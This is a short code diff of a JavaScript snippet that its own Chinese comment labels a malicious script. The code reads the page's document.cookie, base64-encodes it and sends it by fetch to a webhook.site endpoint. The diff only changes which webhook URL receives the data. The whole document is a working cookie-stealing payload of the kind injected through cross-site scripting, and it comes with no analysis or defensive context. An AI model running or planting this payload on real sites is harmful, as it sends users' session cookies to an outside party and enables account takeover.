@@ -1,6 +1,6 @@
 // 惡意 script
 var cookie = document.cookie;
 fetch(
-  "https://webhook.site/7916beea-b3a9-4e85-bce4-d650211fbb0d?" +
+  "https://webhook.site/6f6faf51-a953-48cf-8259-d264a2822efa?" +
     window.btoa(cookie)
 );
